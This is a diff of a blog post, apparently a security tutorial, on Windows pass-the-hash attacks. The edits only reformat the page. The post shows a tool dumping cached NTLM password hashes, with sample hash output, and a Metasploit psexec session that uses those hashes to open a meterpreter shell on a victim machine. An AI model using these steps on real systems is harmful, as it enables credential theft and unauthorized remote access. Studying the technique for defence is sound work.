@@ -184,9 +184,8 @@ google_ad_height = 600;
 <p>There are two types of hashes:</p>
 
 <ul>
-<li><a href="http://en.wikipedia.org/wiki/LM_hash">LM hash, LanMan, or LAN Manager hash</a>: It is the obsolete hashing algorithm. Refer to the link to see how it is computed.</li>
-
-<li>NTLMv2 Hash: This is latest hashing method used on Windows 7/Vists/2008 systems.</li>
+  <li><a href="http://en.wikipedia.org/wiki/LM_hash">LM hash, LanMan, or LAN Manager hash</a>: It is the obsolete hashing algorithm. Refer to the link to see how it is computed.</li>
+  <li>NTLMv2 Hash: This is latest hashing method used on Windows 7/Vists/2008 systems.</li>
 </ul>
 
 <p>Whenever a domain user logs on to the client computer, the hash of its password is stored on the client so that user can be authenticated in future even if the domain controller is not available. There are two types of caching, which is mentioned <a href="http://support.microsoft.com/kb/913485">here</a>.</p>
@@ -194,7 +193,8 @@ google_ad_height = 600;
 <p>Now lets suppose, somebody has used your office laptop to log in and access some intranet based sites. Then that user’s password hash is stored in your system.</p>
 
 <p>You can retrieve these hashes using a utility such as <a href="http://oss.coresecurity.com/projects/pshtoolkit.htm">PSH Toolkit</a>. It contains a utility <strong>whosthere</strong> which can dump the hashes.</p>
-<div class='highlight'><pre><code class='text'>C:\Documents and Settings\madhur\Desktop\pshtoolkit_v1.4\whosthere-alt&gt;whosthere-alt.exe
+
+<div class="highlight"><pre><code class="text">C:\Documents and Settings\madhur\Desktop\pshtoolkit_v1.4\whosthere-alt&gt;whosthere-alt.exe
 WHOSTHERE-ALT v1.1 - by Hernan Ochoa (hochoa@coresecurity.com, hernan@gmail.com)
  - (c) 2007-2008 Core Security Technologies
 This tool lists the active LSA logon sessions with NTLM credentials.
@@ -204,8 +204,10 @@ the output format is: username:domain:lmhash:nthash
 madhur:BACKTRACK:123A85F000020D1BAAD3B435B51404EE:5530F36C167C7993E976989949788A9B
 BACKTRACK$:WORKGROUP:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0
 </code></pre></div>
+
 <p>Once you have grabbed the hash, you can anytime compromise the victim’s computer using metaspoilt’s psexec module, if you know the IP address, which is not difficult considering an intranet evnironment.</p>
-<div class='highlight'><pre><code class='text'>msf exploit(psexec) &gt; use windows/smb/psexec
+
+<div class="highlight"><pre><code class="text">msf exploit(psexec) &gt; use windows/smb/psexec
 msf exploit(psexec) &gt; set RHOST 192.168.0.13
 RHOST =&gt; 192.168.0.13
 msf exploit(psexec) &gt; set LHOST 192.168.0.14
@@ -238,23 +240,20 @@ msf exploit(psexec) &gt; exploit
 
 meterpreter &gt; 
 </code></pre></div>
+
 <p>If you have trouble exploiting the target system, then it might be some security enabled your Administrator. For ex</p>
 
 <ul>
-<li>Simple file sharing is disabled (Windows XP)</li>
-
-<li>Windows UAC drops all the Administrator privileges from the SAT (Security Access Token) for REMOTE connections that are using LOCAL accounts. This restriction prevents all remote administrative functions such as connecting to administrative shares (C$, etc) installing services or launching a new process (psexec)</li>
-
-<li>“HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” on the target systems and setting the value of “RequireSecuritySignature” to “0”.</li>
+  <li>Simple file sharing is disabled (Windows XP)</li>
+  <li>Windows UAC drops all the Administrator privileges from the SAT (Security Access Token) for REMOTE connections that are using LOCAL accounts. This restriction prevents all remote administrative functions such as connecting to administrative shares (C$, etc) installing services or launching a new process (psexec)</li>
+  <li>“HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters” on the target systems and setting the value of “RequireSecuritySignature” to “0”.</li>
 </ul>
 
-<p>References:</p>
+<p>References:
+* <a href="http://oss.coresecurity.com/pshtoolkit/doc/index.html">http://oss.coresecurity.com/pshtoolkit/doc/index.html</a>
+* <a href="https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html">https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html</a></p>
 
-<ul>
-<li><a href="http://oss.coresecurity.com/pshtoolkit/doc/index.html">http://oss.coresecurity.com/pshtoolkit/doc/index.html</a></li>
 
-<li><a href="https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html">https://www.infosecisland.com/blogview/9271-NTLM-Passwords-Cant-Crack-it-Just-Pass-it.html</a></li>
-</ul>
 			<footer>
 				<div class="blocked tags">
 					<p>
